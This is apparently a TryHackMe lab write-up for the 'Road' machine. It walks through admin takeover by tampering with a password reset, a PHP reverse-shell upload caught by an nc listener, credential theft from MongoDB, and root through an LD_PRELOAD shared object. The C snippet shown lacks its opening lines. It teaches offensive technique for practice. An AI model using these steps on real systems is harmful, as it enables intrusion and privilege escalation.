# Road

---

Platform: Tryhackme

Difficulty: Medium

Initial access: Insecure Direct Object Reference (IDOR)

Privilege escalation: LD_PRELOAD Privilege Escalation

---

Nmap scan results:

```bash
┌──(ghost㉿kali)-[~/tryhackme/road]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=3000 10.10.104.67 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 08:37 EDT
Warning: 10.10.104.67 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.104.67
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sky Couriers
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 22: Openssh 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
- Port 80: http apache httpd 2.4.41 ((Ubuntu))

---

### Port 80:

A Sky couriers named website is hosted with most of the links not working, except that merchant central.

<aside>
💡

In writeups, I don’t write steps which didn’t worked but you should always enumerate as deep as you can . Here, I only present steps which I worked for me and which was useful for chaining vulnerabilities. Always enumerate deeply.

</aside>

![image.png](image.png)

As we click on merchant central, it redirect us to [`/v2/admin/login.html`](http://10.10.221.173/v2/admin/login.html) . Here we can try combination of weak passwords, but it didn’t worked. Let’s register ourself as test user(test@test.com:pass) , so that we can see what we can access or modify from inside.

![image.png](image%201.png)

After signing in , we can see our dashboard and a lot of inactive links except some resetUser option. Let’s check our profile page.

![image.png](image%202.png)

![image.png](image%203.png)

At profile page, there is a profile image upload functionality, but only admin has access for that currently. And also we got the admin’s email = admin@sky.thm

---

### Initial Access

Coming back to resetUser page:

![image.png](image%204.png)

I intercepted password reset request and there I was able to change email and change the admin’s password via the help of that admin email we got earlier. Now, we can log in to admin’s account.

![image.png](image%205.png)

And now can also use that image upload functionality via admin’s account by uploading webshell(php-reverse-shell) here.

And we can check it’s source code there is a endpoint `/v2/profileimages` from where we can trigger our uploaded image(shell).

![image.png](image%206.png)

 Now, just trigger that shell from that endpoint and keep your netcat on listening mode.

url = [`http://10.10.8.71/v2/profileimages/php-reverse-shell.php`](http://10.10.8.71/v2/profileimages/php-reverse-shell.php)

```bash
┌──(ghost㉿kali)-[~/tryhackme/road]
└─$ rlwrap -f . -r nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.17.87.131] from (UNKNOWN) [10.10.8.71] 50832
.....
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@sky:/$ cd /home
cd /home
www-data@sky:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root         root         4096 May 25  2021 .
drwxr-xr-x 20 root         root         4096 May 25  2021 ..
drwxr-xr-x  4 webdeveloper webdeveloper 4096 Oct  8  2021 webdeveloper
www-data@sky:/home$ cd webdeveloper
cd webdeveloper
www-data@sky:/home/webdeveloper$ ls -la
ls -la
total 36
drwxr-xr-x 4 webdeveloper webdeveloper 4096 Oct  8  2021 .
drwxr-xr-x 3 root         root         4096 May 25  2021 ..
lrwxrwxrwx 1 webdeveloper webdeveloper    9 May 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 webdeveloper webdeveloper  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 webdeveloper webdeveloper 3771 Feb 25  2020 .bashrc
drwx------ 2 webdeveloper webdeveloper 4096 May 25  2021 .cache
drwxrwxr-x 3 webdeveloper webdeveloper 4096 May 25  2021 .local
-rw------- 1 webdeveloper webdeveloper   51 Oct  8  2021 .mysql_history
-rw-r--r-- 1 webdeveloper webdeveloper  807 Feb 25  2020 .profile
-rw-r--r-- 1 webdeveloper webdeveloper    0 Oct  7  2021 .sudo_as_admin_successful
-rw-r--r-- 1 webdeveloper webdeveloper   33 May 25  2021 user.txt
www-data@sky:/home/webdeveloper$ cat user.txt
cat user.txt
63191e4ece37523.....REDACTED
```

And we got www-data’s shell!

---

### Shell as Webdeveloper

While enumerating directories , services and etc. things. We can see that an internal port 27017(default port for mongodb) was open internally, let’s check if we can access mongodb shell directly.

```bash
www-data@sky:/var/www/html/phpMyAdmin$ ss -tuln
ss -tuln
Netid State  Recv-Q  Send-Q     Local Address:Port    Peer Address:Port Process 
udp   UNCONN 0       0          127.0.0.53%lo:53           0.0.0.0:*            
udp   UNCONN 0       0        10.10.8.71%eth0:68           0.0.0.0:*            
tcp   LISTEN 0       4096       127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN 0       128              0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN 0       70             127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0       511            127.0.0.1:9000         0.0.0.0:*            
tcp   LISTEN 0       4096           127.0.0.1:27017        0.0.0.0:*            
tcp   LISTEN 0       151            127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0       511                    *:80                 *:*            
tcp   LISTEN 0       128                 [::]:22              [::]:*
```

And we were able to gain mongodb’s shell internally, let’s enumerate it and gain our juicy things.

```bash
www-data@sky:/var/www/html/phpMyAdmin$ mongo
mongo
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
.....
> show dbs
shshow dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
> use backup
ususe backup
switched to db backup
> show collections;
shshow collections;
collection
user
> db.user.find()
dbdb.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

From here, we can get webdeveloper’s password, we will use them to log into webdeveloper’s account via ssh.

```bash
┌──(ghost㉿kali)-[~/tryhackme/road]
└─$ ssh webdeveloper@10.10.8.71  
.....
webdeveloper@10.10.8.71's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)
webdeveloper@sky:~$ id
uid=1000(webdeveloper) gid=1000(webdeveloper) groups=1000(webdeveloper),24(cdrom),27(sudo),30(dip),46(plugdev)
```

---

### Shell as Root

If we check webdeveloper’s sudo privileges , he can run `/usr/bin/sky_backup_utility` with root level permission.

And one more interesting thing, we can see here, env_keep+=LD_PRELOAD , which we can use to gain root’s shell. Let’s go!

```bash
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

While searching for privesc via env_keep+=LD_PRELOAD , I came to a post by hacking articles, which explains it’s full process.

[Linux Privilege Escalation using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

Let’s just follow that steps:

1. Generate a c program file under /tmp directory.
    
    ```c
    webdeveloper@sky:~$ cd /tmp
    webdeveloper@sky:/tmp$ nano shell.c
    ```
    
    copy paste this c code inside that shell.c file.
    
    ```c
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
    }
    ```
    
2. Compile it to generate a shared object .so extension file.
    
    ```bash
    webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
    shell.c: In function ‘_init’:
    shell.c:6:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
        6 | setgid(0);
          | ^~~~~~
    shell.c:7:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
        7 | setuid(0);
          | ^~~~~~
    ```
    
3. Now just set env LD_PRELOAD to that .so file and run with our binary of which we have sudo access.
    
    ```bash
    webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
    # id
    uid=0(root) gid=0(root) groups=0(root)
    # cd /root
    # ls -la
    total 36
    drwx------  6 root root 4096 Oct  8  2021 .
    drwxr-xr-x 20 root root 4096 May 25  2021 ..
    drwxr-xr-x  2 root root 4096 Aug  7  2021 .backup
    lrwxrwxrwx  1 root root    9 May 25  2021 .bash_history -> /dev/null
    -rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
    drwx------  2 root root 4096 Oct  8  2021 .cache
    drwxr-xr-x  3 root root 4096 May 25  2021 .local
    -rw-r--r--  1 root root  161 Dec  5  2019 .profile
    -r--------  1 root root   33 May 24  2021 root.txt
    drwx------  2 root root 4096 May 25  2021 .ssh
    # cat root.txt
    3a62d897c40....REDACTED
    ```
    
4. Enjoy root shell!

---

That’s it for this machine.✅